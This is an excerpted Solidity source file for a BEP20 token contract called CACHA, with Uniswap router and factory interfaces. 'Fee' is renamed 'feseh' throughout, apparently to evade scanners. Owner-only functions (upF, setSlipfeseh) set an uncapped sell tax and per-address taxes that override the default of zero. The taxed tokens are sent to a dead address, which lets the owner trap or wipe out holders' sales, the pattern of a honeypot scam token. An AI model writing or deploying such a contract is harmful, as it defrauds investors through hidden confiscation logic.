...
interface IUniswapV2Factory {
    ...
    function fesehTo() external view returns (address);
    function fesehToSetter() external view returns (address);
    ...
    function setfesehTo(address) external;
    function setfesehToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfesehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfesehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfesehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfesehOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfesehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CACHA is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeseh = 0;

    uint256 private _defaultBuyfeseh = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeseh;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeseh = _value;
    }

    function setSlipfeseh(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeseh[_address] = _value;
    }

    function getSlipfeseh(address _address) external view onlyownar returns (uint256) {
        return _slipfeseh[_address];
    }


    function setMAccountfeseh(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeseh(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefesehAmount = 0;

        if (rF) {
            uint256 tradefeseh = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeseh = _defaultSellfeseh;
                }
                if (from == uniswapV2Pair) {

                    tradefeseh = _defaultBuyfeseh;
                }
            }
            if (_slipfeseh[from] > 0) {
                tradefeseh = _slipfeseh[from];
            }

            tradefesehAmount = _Amount.mul(tradefeseh).div(100);
        }


        if (tradefesehAmount > 0) {
            _balances[from] = _balances[from].sub(tradefesehAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefesehAmount);
            emit Transfer(from, _deadAddress, tradefesehAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefesehAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefesehAmount);
        emit Transfer(from, _to, _Amount - tradefesehAmount);
    }
